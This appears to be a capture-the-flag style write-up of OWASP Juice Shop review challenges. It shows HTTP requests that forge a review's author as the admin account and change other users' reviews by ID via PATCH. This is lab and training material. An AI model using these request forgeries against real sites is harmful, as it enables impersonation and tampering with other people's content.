- Post any review to see the Requests and Responses
- See
```
PUT /rest/products/1/reviews HTTP/1.1
[...]
{"message":"Test","author":"Anonymous"}
```
- Change the `author` to someone else
```
{"message":"It tastes like apple!","author":"admin@juice-sh.op"}
```
- Complete the challenge
- But since the challenge also says "...edit any user's existing review," I will test it out too.
- Try editing a review
- See
```
PATCH /rest/products/reviews HTTP/1.1
[...]
{"id":"je57ytueiKfukrYde","message":"Test"}
```
- So to edit a comment, I need to obtain the comment's id
- Try liking a comment
- See
```
POST /rest/products/reviews HTTP/1.1
[...]
{"id":"L3PKZcidSfPGTuJzX"}
```
- It seems I hit bingo.
- Now send the PATCH request to Repeater to edit the comment with `"id":"L3PKZcidSfPGTuJzX"`
```
PATCH /rest/products/reviews HTTP/1.1
[...]
{"id":"L3PKZcidSfPGTuJzX","message":"Blegh :(("}
```
- Succeed
- Actually, I also notice the `GET /rest/products/1/reviews HTTP/1.1` request returns all comments' ids!
```
{"status":"success","data":[{"message":"One of my favorites!","author":"admin@juice-sh.op","product":1,"likesCount":1,"likedBy":["jim@juice-sh.op"],"_id":"HwkhrDuPL92B4WnL9","liked":true},{"message":"Great! We'll have an apple party. Everyone brings an apple and - STUFFS IT DOWN EACH OTHER'S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":1,"likedBy":["jim@juice-sh.op"],"_id":"L3PKZcidSfPGTuJzX","liked":true},{"product":"1","message":"It tastes like orange juice!","author":"Anonymous","likesCount":0,"likedBy":[],"_id":"Hnb6s7wJeh7hnEQT5"},{"product":"1","message":"Test","author":"jim@juice-sh.op","likesCount":0,"likedBy":[],"_id":"je57ytueiKfukrYde"},{"product":"1","message":"Test","author":"jim@juice-sh.op","likesCount":0,"likedBy":[],"_id":"Xw9ztTuQSspuP6iGD"},{"product":"1","message":"Test","author":"Anonymous","likesCount":0,"likedBy":[],"_id":"7og8z73njvrv5wWfC"},{"product":"1","message":"Test2","author":"admin@juice-sh.op","likesCount":0,"likedBy":[],"_id":"AfH4WQ3Hfo3yW6AM3"}]}
```
- So there was no need to use the like button method like I did.